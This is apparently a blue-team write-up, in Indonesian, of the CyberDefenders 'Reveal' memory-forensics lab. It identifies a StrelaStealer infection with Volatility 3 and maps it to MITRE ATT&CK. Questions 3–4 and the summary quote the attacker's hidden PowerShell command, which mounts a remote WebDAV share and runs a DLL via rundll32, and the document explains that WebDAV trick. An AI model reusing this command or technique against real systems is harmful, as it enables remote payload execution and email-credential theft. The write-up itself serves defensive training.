# Reveal Lab — CyberDefenders

> **Platform:** CyberDefenders
> **Category:** Endpoint Forensics
> **Difficulty:** Easy
> **Status:** ✅ Completed
> **Date:** 2026-08-13
> **Time Spent:** ~45 menit

---

## 📌 Prolog

Merekonstruksi multi-stage attack dengan menganalisis Windows memory dump pakai Volatility 3 — identifikasi proses mencurigakan, command line, dan korelasi temuan dengan threat intelligence.

**Tools:** Volatility 3

**Tactics yang tercakup:** Stealth | Discovery

**Catatan:** lab ini berstatus *Retired* di platform CyberDefenders.

---

## 🎯 Scenario

Lo berperan sebagai forensic investigator di sebuah institusi finansial. SIEM lo flag aktivitas mencurigakan di salah satu workstation yang punya akses ke data finansial sensitif. Curiga ada breach, lo dapet memory dump dari mesin yang dicurigai kompromise.

Tugas lo: analisis memory buat nyari tanda-tanda kompromise, trace asal-usul anomalinya, dan assess scope insiden ini biar bisa di-*contain* secara efektif.

---

## ❓ Questions

1. Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?
2. Knowing the parent process ID (PPID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?
3. Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?
4. Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?
5. What is the MITRE ATT&CK sub-technique ID that describes the execution of a second-stage payload using a Windows utility to run the malicious file?
6. Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?
7. Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?

---

## 🔍 Answer & Walkthrough

### 1. What is the name of the malicious process?

Mulai dari `windows.pstree` buat lihat process tree penuh:
```
vol -f memdump.mem windows.pstree
```
![Process Tree](./assets/windows-ps-tree.png)

Ketemu `powershell.exe` (PID `3692`) yang jalan dengan `-windowstyle hidden` — flag klasik buat nyembunyiin window PowerShell dari user, biasa dipake malware biar nggak keliatan popup di layar.

**Jawaban:** `powershell.exe`

---

### 2. What is the parent PID of the malicious process?

Masih dari `pstree` yang sama, `powershell.exe` (PID 3692) punya PPID `4120` — tapi PID `4120` itu sendiri **udah nggak ada lagi di process tree**, artinya parent process-nya udah exit duluan (pola yang sama kayak proses orphaned di lab-lab sebelumnya). Dari tree juga kelihatan ada `wordpad.exe` dan sebelumnya `thunderbird.exe` yang jalan berdekatan secara waktu — pola ini ngarah ke dugaan **T1566.001 (Phishing: Spearphishing Attachment)**: korban buka attachment (mungkin nyamar sebagai dokumen) dari Thunderbird, yang kebuka lewat WordPad, dan dari situ chain eksekusi ke PowerShell dimulai.

**Jawaban:** `4120`

---

### 3. What is the file name that the malware uses to execute the second-stage payload?

Cmdline lengkap dari `powershell.exe` (PID 3692) ke-capture di `pstree`/`cmdline`:
```
powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```
`rundll32` dipanggil buat jalanin export function `entry` dari `3435.dll`, yang di-fetch langsung dari share WebDAV attacker — nggak pernah ditulis ke disk lokal secara normal (dieksekusi langsung dari path UNC remote).

**Jawaban:** `3435.dll`

---

### 4. What is the name of the shared directory being accessed on the remote server?

Masih dari cmdline yang sama: `net use \\45.9.74.32@8888\davwwwroot\`.

Perhatiin sintaks `\\IP@PORT\share\` — ini trik klasik penyalahgunaan **Windows WebClient (WebDAV redirector)**: format `IP@PORT` bikin Windows nge-treat UNC path itu sebagai WebDAV share yang sebenernya nge-resolve ke `http://45.9.74.32:8888/davwwwroot/`. Attacker host file `.dll` di WebDAV server itu, terus `rundll32` bisa langsung eksekusi dari sana kayak file lokal — nggak perlu proses download eksplisit yang gampang ke-flag.

**Jawaban:** `davwwwroot`

---

### 5. What is the MITRE ATT&CK sub-technique ID that describes the execution of a second-stage payload using a Windows utility to run the malicious file?

`rundll32.exe` dipake buat eksekusi `3435.dll` — ini persis definisi teknik **System Binary Proxy Execution: Rundll32** di MITRE ATT&CK.

![MITRE T1218.011](./assets/mitre-attack-rundll32-stealth.png)

> "Rundll32 (T1218.011): Used to execute functions exported from DLL files. It can be used to launch second-stage payloads directly from a downloaded or dropped DLL."

**Jawaban:** `T1218.011`

---

### 6. What is the username that the malicious process runs under?

Cek environment variable proses `powershell.exe` (PID 3692):
```
vol -f memdump.mem windows.envars --pid 3692
```
![Environment Variables](./assets/windows-envars.png)

Ketemu `USERNAME: Elon`, `USERPROFILE: C:\Users\Elon`, `USERDOMAIN: DESKTOP-T5ILU0E` — konsisten juga sama `HOMEPATH: \Users\Elon`.

**Jawaban:** `elon`

---

### 7. What is the name of the malware family?

Dari `netscan`, proses `net.exe` (PID 2416) konek ke `45.9.74.32:8888` (ESTABLISHED) — persis IP & port yang sama dari cmdline WebDAV tadi:
```
vol -f memdump.mem windows.netscan
```
![Net Scan](./assets/windows-net-scan.png)

Cross-check IP itu ke VirusTotal — **16/91 vendor flag sebagai malicious**, dan crowdsourced context langsung ngasih label:
![VirusTotal Check](./assets/virustotal-cek-ip-c2.png)

> "Activity related to **STRELASTEALER** — this IPv4 is used by STRELASTEALER. StrelaStealer is actively stealing email account credentials from Outlook and Thunderbird..."

Dikonfirmasi lagi lewat Malpedia:
![Malpedia StrelaStealer](./assets/malpedia-info-malware.png)

> "StrelaStealer seeks to extract email account log-in credentials... searches for 'logins.json' (account/password) and 'key4.db' (password database) within the '%APPDATA%\Thunderbird\Profiles\' directory."

Ini nyambung persis sama `thunderbird.exe` yang muncul di process tree — targetnya emang credential Thunderbird korban.

**Jawaban:** `STRELASTEALER`

---

## 🚨 Key Findings / IOCs

| Tipe | Value | Keterangan |
|------|-------|------------|
| Proses Mencurigakan | `powershell.exe` (PID 3692) | `-windowstyle hidden`, PPID `4120` orphaned |
| Second-Stage Payload | `3435.dll` | Dieksekusi via `rundll32 ...,entry` langsung dari WebDAV, nggak nulis ke disk |
| Shared Directory (WebDAV) | `davwwwroot` | Diakses via trik UNC `\\IP@PORT\share\` (WebClient abuse) |
| C2 IP:Port | `45.9.74.32:8888` | VT 16/91, AS 207569 (Ihor Hosting Ltd), Finland |
| Child Process | `net.exe` (PID 2416), `conhost.exe` | `net.exe` dipake buat mount WebDAV share |
| Username | `elon` | Akun yang menjalankan proses malicious |
| Malware Family | `STRELASTEALER` | Konfirmasi VirusTotal + Malpedia — target credential Outlook/Thunderbird |
| MITRE Sub-technique | `T1218.011` | System Binary Proxy Execution: Rundll32 |

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique | ID | Keterangan |
|--------|-----------|----|------------|
| Initial Access *(hipotesis, belum confirmed)* | Phishing: Spearphishing Attachment | [T1566.001](https://attack.mitre.org/techniques/T1566/001/) | `wordpad.exe` & `thunderbird.exe` muncul berdekatan sebelum chain PowerShell — indikasi attachment dibuka dari email, tapi belum ada bukti langsung (isi email/attachment) di evidence yang ada |
| Execution | Command and Scripting Interpreter: PowerShell | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | `powershell.exe -windowstyle hidden` jalanin `net use` + `rundll32` |
| Command and Control | Ingress Tool Transfer | [T1105](https://attack.mitre.org/techniques/T1105/) | `3435.dll` di-fetch dari WebDAV share attacker (`davwwwroot`) |
| Defense Evasion | System Binary Proxy Execution: Rundll32 | [T1218.011](https://attack.mitre.org/techniques/T1218/011/) | `rundll32 3435.dll,entry` — proxy eksekusi lewat LOLBin resmi Windows |
| Credential Access | Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | StrelaStealer nyari `logins.json` & `key4.db` di profil Thunderbird korban |
| Exfiltration | Exfiltration Over C2 Channel | [T1041](https://attack.mitre.org/techniques/T1041/) | Credential yang ke-curi dikirim balik ke C2 `45.9.74.32:8888` |

---

## 📋 Summary — Attacker Behavior & Todo

### Attacker Behavior

Kemungkinan besar insiden ini berawal dari **phishing** — `thunderbird.exe` dan `wordpad.exe` muncul berdekatan di memory sebelum chain eksekusi malicious dimulai, pola yang konsisten sama korban buka attachment dari email lewat WordPad. Parent process (PID `4120`) yang men-trigger `powershell.exe` udah nggak ada lagi di process tree pas snapshot diambil — khas pola proses yang buru-buru exit abis nge-spawn payload, biar rantai eksekusi susah ditrace balik.

`powershell.exe` (PID 3692) jalan dengan flag `-windowstyle hidden` dan langsung eksekusi command yang cukup elegan buat teknik LOLBin: pertama `net use \\45.9.74.32@8888\davwwwroot\` buat mount **WebDAV share** attacker (trik `IP@PORT` bikin Windows WebClient nge-resolve ini ke `http://45.9.74.32:8888/davwwwroot/`), terus `rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry` buat langsung eksekusi DLL kedua ("second-stage payload") dari remote share itu — tanpa pernah nulis file ke disk lokal secara normal. Proses ini juga men-spawn `net.exe` (buat mounting share) dan `conhost.exe` sebagai child process.

Payload ini teridentifikasi sebagai **StrelaStealer** — malware family yang spesialisasi nyuri credential email dari **Outlook dan Mozilla Thunderbird**. Begitu jalan, StrelaStealer nyari file `logins.json` (akun/password) dan `key4.db` (password database terenkripsi) di folder `%APPDATA%\Thunderbird\Profiles\`, decrypt pakai Windows `CryptUnprotectData`, terus exfiltrate hasilnya ke C2 (`45.9.74.32:8888`) — infrastruktur yang sama yang dipake buat serve payload `3435.dll` di awal. Semua ini jalan under akun user `elon`, yang berarti itu akun yang kompromise dan perlu di-reset credential-nya.

### Todo / Follow-up

- [ ] Cek artifact Thunderbird (mailbox/attachment cache) di mem dump buat konfirmasi langsung vector phishing-nya (validasi hipotesis T1566.001)
- [ ] Coba extract/dump `3435.dll` dari traffic atau memory buat static analysis lanjut (kalau masih ke-cache)
- [ ] Cross-check IP `45.9.74.32` (AS 207569, Ihor Hosting Ltd) ke ThreatFox/AbuseIPDB buat history campaign StrelaStealer lain
- [ ] Cek timeline pasti `wordpad.exe`/`thunderbird.exe` vs kemunculan `powershell.exe` (PID 4120 orphaned) buat mastiin urutan kejadian
- [ ] Pelajari apakah StrelaStealer di sample ini juga nyoba curi credential Outlook (via registry IMAP key), bukan cuma Thunderbird

---

## 📚 References

- [CyberDefenders — Reveal Lab](https://cyberdefenders.org/)
- [MITRE ATT&CK — T1218.011 System Binary Proxy Execution: Rundll32](https://attack.mitre.org/techniques/T1218/011/)
- [Malpedia — win.strelastealer](https://malpedia.caad.fkie.fraunhofer.de/details/win.strelastealer)

---

*Writeup ini dibuat sebagai bagian dari perjalanan belajar Blue Team / SOC Analyst.*
